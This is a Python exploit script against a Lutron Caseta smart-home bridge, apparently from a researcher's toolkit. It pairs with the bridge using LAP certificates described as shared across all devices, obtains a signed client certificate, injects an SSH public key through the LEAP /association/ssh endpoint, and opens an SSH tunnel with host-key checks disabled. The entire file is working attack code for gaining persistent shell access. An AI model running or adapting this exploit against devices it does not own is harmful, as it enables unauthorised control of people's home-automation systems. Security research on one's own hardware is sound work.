#!/usr/bin/env python3
"""
Caseta bridge pairing + SSH key injection exploit.

Flow:
1. Connect to LAP port 8083 with Lutron's shared LAP certs
2. Complete pairing (requires 3x button press on bridge)
3. Get signed client cert
4. Connect to LEAP port 8081 with client cert
5. Inject SSH key via /association/ssh endpoint
6. Trigger authorized_keys refresh

Usage: caseta-pair.py <bridge_ip>
"""
import ssl
import socket
import json
import sys
import os
import time
import subprocess
import tempfile

BRIDGE_IP = sys.argv[1] if len(sys.argv) > 1 else "169.254.189.191"
LAP_PORT = 8083
LEAP_PORT = 8081
CERT_DIR = "/Volumes/Secondary/lutron-tools/data/rr-sel-rep2/usr/share/lap-certs"
OUT_DIR = "/Volumes/Secondary/lutron-tools/data/caseta-exploit"

# LAP certs (shared across all Caseta devices)
LAP_CA = os.path.join(CERT_DIR, "casetaLocalAccessProtocol.crt")
LAP_CERT = os.path.join(CERT_DIR, "casetaSmartBridgeSignedByLutron.crt")
LAP_KEY = os.path.join(CERT_DIR, "casetaSmartBridge.pem")

SSH_PUBKEY = open(os.path.expanduser("~/.ssh/id_rsa_lutron.pub")).read().strip()

def make_tls_context(cert=None, key=None, ca=None, verify=False):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE if not verify else ssl.CERT_REQUIRED
    if cert and key:
        ctx.load_cert_chain(cert, key)
    if ca:
        ctx.load_verify_locations(ca)
    return ctx

def leap_send_recv(sock, communique_type, url, body=None, timeout=5):
    msg = {
        "CommuniqueType": communique_type,
        "Header": {"Url": url}
    }
    if body:
        msg["Body"] = body

    data = json.dumps(msg) + "\r\n"
    sock.sendall(data.encode())

    # Read response
    response = b""
    sock.settimeout(timeout)
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
            if b"\r\n" in response or b"\n" in response:
                break
    except socket.timeout:
        pass

    text = response.decode("utf-8", errors="replace").strip()
    if text:
        try:
            return json.loads(text.split("\n")[0])
        except json.JSONDecodeError:
            print(f"  Raw response: {text[:200]}")
            return None
    return None

def generate_client_cert():
    """Generate a client key and CSR."""
    os.makedirs(OUT_DIR, exist_ok=True)
    key_path = os.path.join(OUT_DIR, "client.key")
    csr_path = os.path.join(OUT_DIR, "client.csr")
    cert_path = os.path.join(OUT_DIR, "client.crt")

    # Generate EC key
    subprocess.run([
        "openssl", "ecparam", "-genkey", "-name", "prime256v1",
        "-out", key_path
    ], check=True, capture_output=True)

    # Generate CSR
    subprocess.run([
        "openssl", "req", "-new", "-key", key_path,
        "-out", csr_path,
        "-subj", "/C=US/ST=Pennsylvania/L=Coopersburg/O=Lutron Electronics Co., Inc./CN=ExploitClient"
    ], check=True, capture_output=True)

    csr_pem = open(csr_path).read()
    return key_path, csr_pem, cert_path

def phase1_pair():
    """Connect to LAP port 8083 and complete pairing."""
    print(f"\n[Phase 1] Connecting to {BRIDGE_IP}:{LAP_PORT} (LAP pairing)")

    ctx = make_tls_context(cert=LAP_CERT, key=LAP_KEY, ca=LAP_CA)

    raw = socket.create_connection((BRIDGE_IP, LAP_PORT), timeout=10)
    sock = ctx.wrap_socket(raw, server_hostname=BRIDGE_IP)
    print(f"  TLS connected: {sock.version()}")
    print(f"  Server cert CN: {dict(x[0] for x in sock.getpeercert()['subject'])['commonName']}")

    # Generate client cert
    key_path, csr_pem, cert_path = generate_client_cert()
    print(f"  Generated client key: {key_path}")

    # Step 1: Read server info
    print("\n  Sending ping...")
    resp = leap_send_recv(sock, "ReadRequest", "/server/1/status/ping")
    print(f"  Response: {json.dumps(resp, indent=2)[:200] if resp else 'None'}")

    # Step 2: Request pairing
    print("\n  *** PRESS THE BUTTON ON THE BRIDGE 3 TIMES WITHIN 30 SECONDS ***")
    print("  Waiting for association mode...")

    # Poll association/ready
    for i in range(60):
        resp = leap_send_recv(sock, "ReadRequest", "/association/ready", timeout=2)
        if resp:
            status = resp.get("Header", {}).get("StatusCode", "")
            if "200" in status:
                print(f"  Association ready! Response: {json.dumps(resp)[:200]}")
                break
        time.sleep(1)
        if i % 5 == 0:
            print(f"  ... waiting ({i}s)")

    # Step 3: Start association
    print("\n  Starting association...")
    resp = leap_send_recv(sock, "CreateRequest", "/association/start")
    print(f"  Response: {json.dumps(resp, indent=2)[:300] if resp else 'None'}")

    # Step 4: Submit CSR for signing
    print("\n  Submitting CSR for signing...")
    resp = leap_send_recv(sock, "CreateRequest", "/association",
                         body={"CSR": csr_pem})
    print(f"  Response: {json.dumps(resp, indent=2)[:500] if resp else 'None'}")

    if resp and "Body" in resp:
        signed_cert = resp["Body"].get("SignedCertificate", "")
        if signed_cert:
            with open(cert_path, "w") as f:
                f.write(signed_cert)
            print(f"  Signed cert saved to: {cert_path}")
            sock.close()
            return key_path, cert_path

    # Try alternate paths
    print("\n  Trying alternate association flow...")
    resp = leap_send_recv(sock, "CreateRequest", "/pair-setup")
    print(f"  pair-setup response: {json.dumps(resp, indent=2)[:300] if resp else 'None'}")

    sock.close()
    return None, None

def phase2_inject_ssh(client_key, client_cert):
    """Connect to LEAP port 8081 and inject SSH key."""
    print(f"\n[Phase 2] Connecting to {BRIDGE_IP}:{LEAP_PORT} (LEAP SSH injection)")

    # Get bridge CA from the pairing cert chain
    bridge_ca = os.path.join(OUT_DIR, "bridge-ca.crt")

    ctx = make_tls_context(cert=client_cert, key=client_key)

    raw = socket.create_connection((BRIDGE_IP, LEAP_PORT), timeout=10)
    sock = ctx.wrap_socket(raw, server_hostname=BRIDGE_IP)
    print(f"  TLS connected to LEAP!")

    # Ping
    resp = leap_send_recv(sock, "ReadRequest", "/server/1/status/ping")
    print(f"  Ping: {json.dumps(resp)[:200] if resp else 'None'}")

    # Inject SSH key
    print(f"\n  Injecting SSH key...")
    resp = leap_send_recv(sock, "CreateRequest", "/association/ssh",
                         body={"SSHKey": {
                             "Name": "exploit",
                             "UserName": "leap",
                             "Key": SSH_PUBKEY
                         }})
    print(f"  SSH injection response: {json.dumps(resp, indent=2)[:300] if resp else 'None'}")

    # Also try direct SSH key endpoints
    resp = leap_send_recv(sock, "ReadRequest", "/association/ssh/1")
    print(f"  Read SSH keys: {json.dumps(resp, indent=2)[:300] if resp else 'None'}")

    sock.close()

def phase3_test_ssh():
    """Test SSH access."""
    print(f"\n[Phase 3] Testing SSH access to {BRIDGE_IP}")
    result = subprocess.run([
        "ssh", "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "PubkeyAcceptedAlgorithms=+ssh-rsa",
        "-o", "HostkeyAlgorithms=+ssh-rsa",
        "-i", os.path.expanduser("~/.ssh/id_rsa_lutron"),
        f"leap@{BRIDGE_IP}", "-N", "-f",
        "-L", "18080:localhost:8080"
    ], capture_output=True, text=True, timeout=10)

    if result.returncode == 0:
        print("  SSH tunnel established! Port 18080 -> bridge localhost:8080")
        return True
    else:
        print(f"  SSH failed: {result.stderr[:200]}")
        return False

if __name__ == "__main__":
    os.makedirs(OUT_DIR, exist_ok=True)

    print("=" * 60)
    print("  Caseta Bridge Exploit — LAP Pairing + SSH Injection")
    print("=" * 60)

    client_key, client_cert = phase1_pair()

    if client_key and client_cert:
        phase2_inject_ssh(client_key, client_cert)
        phase3_test_ssh()
    else:
        print("\nPairing failed. Check the LAP protocol flow.")
